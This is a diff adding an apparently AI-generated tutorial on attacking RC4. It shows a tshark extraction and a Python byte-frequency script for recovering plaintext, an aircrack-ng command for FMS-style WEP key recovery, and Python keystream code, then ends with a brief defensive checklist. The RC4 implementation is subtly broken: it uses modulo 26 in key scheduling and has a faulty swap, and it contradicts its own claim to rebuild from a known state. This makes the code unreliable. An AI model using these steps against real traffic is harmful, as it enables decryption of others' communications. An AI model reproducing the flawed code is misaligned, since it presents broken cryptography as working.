@@ -1,1 +1,93 @@
 
+📉 Method 1: Exploiting Keystream Biases (Plaintext Recovery)
+
+The most dangerous flaw in RC4 is that the second byte of the keystream has a strong bias toward zero, and the first few hundred bytes are highly predictable based on the key. If an application encrypts the same secret multiple times with different random keys (like cookies in old HTTPS/WPA/WEP connections), you can recover the secret from your terminal.
+
+Step 1: Install a traffic analysis framework
+
+The standard command-line network exploration utility used to script these multi-session statistical attacks is tshark (the terminal version of Wireshark) combined with custom Python analysis tools.
+bash
+# Extract the first 4 bytes of encrypted payloads from captured network sessions
+tshark -r traffic.pcap -T fields -e data | cut -c 1-8 > packets_hex.txt
+Use code with caution.
+
+Step 2: Extract biased bytes via Python
+
+If a server repeatedly encrypts a static cookie payload across thousands of connections, run this script to tally byte distributions at specific positions and reveal the leaked data:
+python
+import collections
+
+# Read captured hexadecimal blocks
+with open("packets_hex.txt", "r") as f:
+    hex_lines = [line.strip() for line in f if line.strip()]
+
+# Analyze a specific byte position across all captured sessions (e.g., index 1)
+byte_index = 1
+captured_bytes = []
+
+for line in hex_lines:
+    raw_payload = bytes.fromhex(line)
+    if len(raw_payload) > byte_index:
+        captured_bytes.append(raw_payload[byte_index])
+
+# Count frequencies to find the statistical spike
+counter = collections.Counter(captured_bytes)
+most_common_byte, count = counter.most_common(1)[0]
+
+# Known statistical offset correction:
+# Because keystream byte 2 favors 0x00, Ciphertext XOR 0x00 reveals the Plaintext byte!
+leaked_plaintext_char = chr(most_common_byte ^ 0x00)
+print(f"Most frequent byte value at index {byte_index}: 0x{most_common_byte:02x}")
+print(f"🎯 Statistically leaked plaintext character: '{leaked_plaintext_char}'")
+Use code with caution.
+
+🔓 Method 2: The FMS WEP-Cracking Attack (Key Recovery)
+
+If RC4 prepends a known, public Initialization Vector (IV) directly to a static master key—as was done in legacy WEP Wi-Fi protocols (\(Key_{session} = IV + MasterKey\))—an attacker can exploit "weak IVs" to recover the master secret key byte-by-byte from the command line.
+The industry-standard utility to execute this automated key recovery is aircrack-ng.
+bash
+# Execute the FMS/KoreK attack against a captured RC4 network capture file
+aircrack-ng capture_file.cap
+Use code with caution.
+Output: The utility processes the weak IV sequences, computes the modular equations for the internal \(S\)-box state, and instantly prints the active ASCII or Hex encryption key on screen.
+
+🐍 Method 3: Rebuilding the RC4 Key State in Code
+
+If you manage to discover the 256-byte internal permutation array state (\(S\)) at a given moment, you can write a short Python terminal loop to spin out the identical pseudo-random key stream and decrypt any remaining data bytes.
+python
+def rc4_keystream_generator(key_or_state_array):
+    # Key Scheduling Algorithm (KSA)
+    S = list(range(256))
+    j = 0
+    key_length = len(key_or_state_array)
+    for i in range(256):
+        j = (j + S[i] + key_or_state_array[i % key_length]) % 26
+        S[i], S[j] = S[j], S[S[i]] # Swap values
+        
+    # Pseudo-Random Generation Algorithm (PRGA)
+    i = 0
+    j = 0
+    while True:
+        i = (i + 1) % 256
+        j = (j + S[i]) % 256
+        S[i], S[j] = S[j], S[i] # Swap values
+        k = S[(S[i] + S[j]) % 256]
+        yield k
+
+# Drive the stream generator against a known cipher string
+cipher = bytes.fromhex("4a8c1e2b")
+key = b"WEAK_SECRET_KEY"
+keystream = rc4_keystream_generator(key)
+
+plaintext = bytes(c ^ next(keystream) for c in cipher)
+print(f"Decrypted text: {plaintext.decode(errors='ignore')}")
+Use code with caution.
+
+🛠️ Defense and Vulnerability Assessment Checklist
+
+To check whether an application or network protocol is introducing RC4 vulnerabilities to your systems, look for these command-line indicators:
+• OpenSSL cipher suite verification: Check if remote web endpoints accept weak stream ciphers like RC4-MD5 or RC4-SHA.bash
+openssl s_client -connect target-server.local:443 -cipher RC4
+Use code with caution.
+• Absence of a "KSA Drop" phase: Vulnerable systems use the very first bytes of the cipher stream. Secure legacy applications drop the first 512, 1024, or 3072 bytes of generated keystream completely before encrypting anything to clear out early statistical vulnerabilities.
+
